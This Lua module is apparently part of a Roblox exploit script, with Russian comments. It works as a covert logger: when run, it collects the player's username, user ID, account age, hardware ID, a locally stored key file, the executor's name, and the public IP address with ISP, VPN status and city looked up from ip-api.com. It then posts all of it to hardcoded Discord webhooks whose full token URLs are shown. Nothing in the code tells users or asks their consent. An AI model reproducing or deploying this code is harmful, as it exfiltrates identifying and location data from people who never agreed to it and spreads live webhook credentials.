-- =============================================================
-- ЛОГГЕР (ОТКРЫТАЯ ВЕРСИЯ, ИСПРАВЛЕНО ПАДЕНИЕ)
-- =============================================================
return function(SEC_STATE)
    if not SEC_STATE or not SEC_STATE.ORIG then return end
    local O = SEC_STATE.ORIG
    local LocalPlayer = SEC_STATE.LocalPlayer
    local HttpService = SEC_STATE.HttpService
    local RbxAnalytics = SEC_STATE.RbxAnalytics
    local UserInputService = SEC_STATE.UserInputService
    local request = O.request
    local game_HttpGet = O.game_HttpGet
    local pcall = O.pcall
    local tostring = O.tostring
    local type = O.type
    local m_floor = O.math_floor
    local task_wait = O.task_wait
    local task_spawn = O.task_spawn
    local s_char = O.s_char
    local s_sub = O.s_sub

    -- БЕЗОПАСНЫЕ ИТЕРАЦИИ (НИКОГДА НЕ ПАДАЮТ)
    local function safe_ipairs(tbl, callback)
        if type(tbl) ~= "table" then return end
        pcall(function()
            for i = 1, #tbl do
                callback(tbl[i])
            end
        end)
    end
    local function safe_pairs(tbl, callback)
        if type(tbl) ~= "table" then return end
        pcall(function()
            for k, v in pairs(tbl) do
                callback(k, v)
            end
        end)
    end
    local function tinsert(arr, val)
        if type(arr) ~= "table" then return end
        table.insert(arr, val)
    end

    -- ВЕБХУКИ
    local WEBHOOK_LOG   = "https://discord.com/api/webhooks/1519409915155838593/sw3cuWpE-S2SVYHM0r1MSEvv8XiLcE_ePdR-RwqxWfQ94cHPccRsd02RwcVYsG77Aga"
    local WEBHOOK_ALERT = "https://discord.com/api/webhooks/1518334033588838182/s1d18Avu2EmWpzTrT0jNIhjT6e1J57YX70OXHMVxxcyuSSw6L6nrBAjwVspga-L7SNKO"

    local uid = tostring(LocalPlayer.UserId)
    local hwid = "N/A"
    pcall(function() hwid = RbxAnalytics:GetClientId() end)
    local key = "N/A"
    pcall(function() key = O.readfile("nazarkus_key.json") end)

    -- ВАЙТЛИСТ/БЛЭКЛИСТ
    local WHITELIST = {
        UIDs = {"10760143653"},
        HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
        Keys = {"46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F", "89D11F50-5490-4677-B709-4EBFBECA78CE"}
    }
    local BLACKLIST = { UIDs = {}, HWIDs = {}, Keys = {} }

    local function inList(list)
        local found = false
        safe_ipairs(list.UIDs, function(v) if v == uid then found = true end end)
        if found then return true end
        safe_ipairs(list.HWIDs, function(v) if v == hwid then found = true end end)
        if found then return true end
        safe_ipairs(list.Keys, function(v) if v == key then found = true end end)
        return found
    end
    local userStatus = inList(WHITELIST) and "whitelist" or (inList(BLACKLIST) and "blacklist" or "guest")
    local spyDetected = SEC_STATE.detected or false
    local spyReason = SEC_STATE.reason or "None"
    SEC_STATE.status = userStatus
    SEC_STATE.hwid = hwid
    SEC_STATE.key = key

    -- ЭКЗЕКЬЮТОР
    local executorName = "Unknown"
    local uncPercent = 0
    pcall(function()
        local supported = 0
        local genv = getgenv and getgenv() or _G
        local uncFuncs = {"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}
        safe_ipairs(uncFuncs, function(funcName) if genv[funcName] then supported = supported + 1 end end)
        uncPercent = m_floor((supported / #uncFuncs) * 100)
        if identifyexecutor then
            pcall(function() executorName = identifyexecutor() end)
        end
    end)
    local executorString = executorName .. " (UNC: " .. uncPercent .. "%)"

    -- СЕТЬ
    local net = {ip="N/A", isp="N/A", vpn="No", country="N/A", city="N/A"}
    pcall(function()
        local r = request({
            Url = "http://ip-api.com/json/?fields=status,country,city,isp,query,proxy,hosting",
            Method = "GET"
        })
        if r and r.Success and r.Body then
            local ok, data = pcall(HttpService.JSONDecode, HttpService, r.Body)
            if ok and data and type(data) == "table" then
                net.ip = data.query or "N/A"
                net.isp = data.isp or "N/A"
                net.vpn = data.proxy and "Yes" or "No"
                net.country = data.country or "N/A"
                net.city = data.city or "N/A"
            end
        end
    end)

    local embeds = {}

    -- АЛЕРТ СПАЯ
    if spyDetected then
        tinsert(embeds, {
            title = "🚨 SECURITY ALERT: HTTP Spy Detected",
            color = 16711680,
            fields = {
                {name = "Detection Reason", value = "```" .. tostring(spyReason) .. "```", inline = false},
                {name = "Player", value = LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")\nID: `" .. uid .. "`", inline = false},
                {name = "Executor", value = executorString, inline = true},
                {name = "System", value = UserInputService.TouchEnabled and "Mobile" or "PC", inline = true},
                {name = "Hardware Info", value = "HWID: `" .. hwid .. "`\nKey: `" .. key .. "`", inline = false},
                {name = "Network", value = "IP: " .. net.ip .. "\nISP: " .. net.isp .. "\nVPN: " .. net.vpn .. "\nLoc: " .. net.country .. ", " .. net.city, inline = false},
                {name = "Links", value = "[Profile](https://www.roblox.com/users/" .. uid .. "/profile)", inline = false}
            }
        })
        pcall(function()
            request({
                Url = WEBHOOK_ALERT,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({embeds = embeds})
            })
        end)
        return
    end

    -- ВАЙТЛИСТ
    if userStatus == "whitelist" then
        tinsert(embeds, {
            title = "✅ Whitelisted User Executed",
            color = 65280,
            fields = {
                {name = "**Player Info**", value = "Name: " .. LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")\nUser ID: `" .. uid .. "`", inline = false},
                {name = "**Executor**", value = executorString, inline = false},
                {name = "**System**", value = "Platform: " .. (UserInputService.TouchEnabled and "Mobile" or "PC"), inline = false},
                {name = "**Hardware Info**", value = "HWID: `" .. hwid .. "`\nKey: `" .. key .. "`", inline = false}
            }
        })
    else
        tinsert(embeds, {
            title = userStatus == "blacklist" and "⛔ Blacklisted User Attempt" or "⚠️ Guest User Executed",
            color = userStatus == "blacklist" and 0 or 16753920,
            fields = {
                {name = "Player Info", value = "Name: " .. LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")\nID: `" .. uid .. "`\nAccount Age: " .. LocalPlayer.AccountAge .. " days", inline = false},
                {name = "Executor", value = executorString, inline = true},
                {name = "System", value = UserInputService.TouchEnabled and "Mobile" or "PC", inline = true},
                {name = "Hardware Info", value = "HWID: `" .. hwid .. "`\nKey: `" .. key .. "`", inline = false},
                {name = "Network", value = "IP: " .. net.ip .. "\nISP: " .. net.isp .. "\nVPN: " .. net.vpn .. "\nLoc: " .. net.country .. ", " .. net.city, inline = false},
                {name = "Links", value = "[Profile](https://www.roblox.com/users/" .. uid .. "/profile)", inline = false}
            }
        })
    end

    pcall(function()
        request({
            Url = WEBHOOK_LOG,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({embeds = embeds})
        })
    end)
end
